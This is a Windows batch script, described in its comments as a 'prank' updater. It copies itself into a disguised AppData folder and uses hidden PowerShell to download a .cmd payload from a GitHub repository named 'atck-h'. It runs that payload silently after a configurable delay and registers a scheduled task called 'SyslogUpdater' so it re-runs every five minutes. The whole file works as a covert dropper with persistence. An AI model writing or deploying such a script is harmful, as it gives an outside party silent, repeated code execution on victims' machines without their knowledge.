@echo off
setlocal enabledelayedexpansion

:: ===================================================================
:: CONFIGURATION – change these values as needed
:: ===================================================================
:: Delay in seconds before first run (600 = 10 minutes, 172800 = 2 days)
set "DELAY=600"

:: How often the updater runs (in minutes)
set "UPDATER_INTERVAL=5"

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"
set "FIRSTRUN_FLAG=%BASE%\firstrun.txt"
set "LOG_FILE=%BASE%\debug.log"

if not exist "%BASE%" mkdir "%BASE%"

:: Copy this updater to the base folder (if not already there)
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
    echo [%DATE% %TIME%] Updater copied to %UPDATER% >> "%LOG_FILE%"
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" (
    echo [%DATE% %TIME%] WARNING: Could not download version file >> "%LOG_FILE%"
    goto RUN
)

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "%LOCAL%"=="%REMOTE%" (
    echo [%DATE% %TIME%] New version detected: local=%LOCAL%, remote=%REMOTE% >> "%LOG_FILE%"
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"
        echo [%DATE% %TIME%] Downloaded new prank to %PRANK% >> "%LOG_FILE%"

        :: Store target time as ticks (locale‑independent)
        for /f "usebackq delims=" %%a in (`powershell -Command "(Get-Date).AddSeconds(%DELAY%).Ticks"`) do set "TARGET_TICKS=%%a"
        echo %TARGET_TICKS% > "%FIRSTRUN_FLAG%"
        echo [%DATE% %TIME%] First‑run flag created with target ticks: %TARGET_TICKS% >> "%LOG_FILE%"
    ) else (
        echo [%DATE% %TIME%] ERROR: Download failed >> "%LOG_FILE%"
    )
)

:RUN
:: If this is a first run (flag exists), check whether the target time has been reached
if exist "%FIRSTRUN_FLAG%" (
    set /p TARGET_TICKS=<"%FIRSTRUN_FLAG%"
    echo [%DATE% %TIME%] Flag exists, target ticks: %TARGET_TICKS% >> "%LOG_FILE%"
    :: Compare current ticks with stored ticks using PowerShell
    powershell -Command "$now = [DateTime]::UtcNow.Ticks; if ($now -ge %TARGET_TICKS%) { exit 0 } else { exit 1 }"
    if !errorlevel! equ 0 (
        echo [%DATE% %TIME%] Target time reached. Starting prank... >> "%LOG_FILE%"
        :: Start the prank hidden (only its child windows will appear)
        start /b "" "%PRANK%"
        :: Give it a moment to launch, then delete the flag
        timeout /t 2 /nobreak >nul
        del "%FIRSTRUN_FLAG%"
        if not exist "%FIRSTRUN_FLAG%" (
            echo [%DATE% %TIME%] Flag deleted successfully >> "%LOG_FILE%"
        ) else (
            echo [%DATE% %TIME%] ERROR: Flag could not be deleted >> "%LOG_FILE%"
        )
    ) else (
        echo [%DATE% %TIME%] Target time not yet reached >> "%LOG_FILE%"
    )
) else (
    echo [%DATE% %TIME%] No flag present >> "%LOG_FILE%"
)

:: Create / update the scheduled task to run this updater every UPDATER_INTERVAL minutes
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo %UPDATER_INTERVAL% /f >nul 2>&1
if !errorlevel! equ 0 (
    echo [%DATE% %TIME%] Scheduled task created/updated successfully >> "%LOG_FILE%"
) else (
    echo [%DATE% %TIME%] ERROR: Failed to create scheduled task >> "%LOG_FILE%"
)

endlocal